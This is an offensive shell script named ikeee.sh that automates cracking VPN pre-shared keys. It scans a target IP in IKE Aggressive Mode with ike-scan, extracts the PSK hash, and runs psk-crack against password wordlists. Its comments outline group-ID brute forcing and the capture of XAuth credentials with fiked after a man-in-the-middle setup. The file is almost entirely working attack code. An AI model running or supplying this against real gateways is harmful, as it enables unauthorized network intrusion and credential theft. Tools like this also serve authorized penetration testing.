#!/bin/sh
#
# Name: ikeee.sh
# Auth: Frank Cass
# Date: 20160226
# Desc: Automated IKE Aggressive Mode Scanner, group ID enumerator and cracker
#
# TODO: Implement fingerprinting the VPN gateway for guessing implementation
# 	ike-scan -M --showbackoff
#
# TODO: Using Ike-force to enumerate the ID groupname
# 	./ikeforce.py $ip -e -w wordlists/groupnames.dic -s 1
#
# TODO: Ike-scan can use the --vendor switch to add the VID payload to outbound packets
#
# TODO: Implement using fiked after successful MitM setup to capture XAuth credentials
# 	Given below is a simple example of fiked. The -g switch specifies the IP address of the gateway
#	captured data is written to a file with the -l switch, -d is used to run it in daemon mode
#	and -k is for “group id: shared key” representation
# 		fiked -g 192.168.1.50 -k testgroup:secretkey -l output.txt -d
#
###

echo "[*] ikeee.sh"
echo "[*] Desc: Automated IKE Aggressive mode scanner & cracker script"
echo ""
echo "[*] Before running this script, you will want to verify that Aggressive mode is enabled and that you can receive a handshake"
echo "[*] In addition, you will need to enumerate the Group ID."
echo "[*] For more information, please see: https://www.trustwave.com/Resources/SpiderLabs-Blog/Cracking-IKE-Mission-Improbable-(Part-1)/"
echo ""
read -p "[*] Enter the Group ID: " id
read -p "[*] Enter an IP: " ip
echo "[*] Performing ike-scan: "; ( set -x; ike-scan --aggressive --multiline --pskcrack -id=$id $ip > ike_$ip.cap ) # Subshell to prevent set +x from being printed by toggling echo on/off mid script
echo "[*] Scan Complete. Saved to:" ike_$ip.cap # No error checking if it failed, just continues.
echo "[*] Formatting output to be used for psk-crack..."; cat ike_$ip.cap | grep -i "IKE PSK" -A 10 | grep -v "Ending" | grep -v "IKE" > ike_$ip.psk
echo "[*] PSK saved to:" ike_$ip.psk
echo "[*] Starting psk-crack"; ( set -x; psk-crack -v -d /usr/share/wordlists/passwords* ike_$ip.psk ); echo "[*] Done" # Another subshell to prevent set +x from being printed through echo toggling
echo "[*] Done."

